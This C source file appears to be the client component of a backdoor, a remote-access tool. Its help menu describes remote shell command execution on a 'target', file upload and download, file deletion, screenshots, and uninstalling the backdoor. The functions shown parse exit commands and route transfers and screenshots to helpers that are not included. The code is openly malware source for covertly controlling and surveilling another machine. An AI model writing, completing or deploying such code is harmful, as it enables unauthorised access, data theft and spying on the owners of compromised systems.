#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include "debug.h"
#include "comms.h"

// Returns 0 if the client wants to close the connection and one otherwise.
// Frees the given command.
char check_exit(char *cmd) {
    int ret = 1;
    if(cmd != NULL) {
        if(strncmp(cmd, "quit", 5) == 0 ||
           strncmp(cmd, "q", 2) == 0 ||
           strncmp(cmd, "exit", 4) == 0 ||
           strncmp(cmd, "uninstall", 9) == 0) {
            ret = 0;
        }
    }
    free(cmd);
    return ret;
}

// Prints the help menu
void print_help() {
    printf("List of implemented commands: \n");
    printf("!<command>: Executes the given command as if it was running on a shell on the server.\n");
    printf("cd <dir>: Changes into the given directory.\n");
    printf("pwd <dir>: Prints out the current working directory.\n");
    printf("cat <file>: Displays the contents of a given file.\n");
    printf("ls <dir>: Lists the contents of a directory (uses current directory if none is given).\n");
    printf("dir <dir>: Same as ls.\n");
    printf("rm <file>: Deletes a given file.\n");
    printf("upload <local file> <remote file>: Uploads a local file to the remote target.\n");
    printf("download <remote file> <local file>: Downloads a remote file onto the local client.\n");
    printf("screenshot: Attempts to take a screenshot of the remote target using scrot, but may fail if scrot could not be installed.\n");
    printf("quit: Closes the connection to the target, but leaves the backdoor server running.\n");
    printf("exit: Same as quit.\n");
    printf("uninstall: Uninstalls the backdoor, closes the server, and closes the connection to the target.\n");
}

// Some commands (such as upload or download) require further processing, which can be done here
void process_cmd(char *cmd) {
    if(strncmp(cmd, "upload ", 7) == 0) {
        strtok(cmd, " "); // Ignore the first token
        send_file(strtok(NULL, " "));
    } else if(strncmp(cmd, "download ", 9) == 0) {
        strtok(cmd, " "); // Ignore the first token
        strtok(NULL, " "); // Ignore the second token (file name for server side)
        get_file(strtok(NULL, " "));
    } else if(strncmp(cmd, "screenshot", 10) == 0) {
        screenshot();
    } else if(strncmp(cmd, "help", 5) == 0) {
        print_help();
    }
}
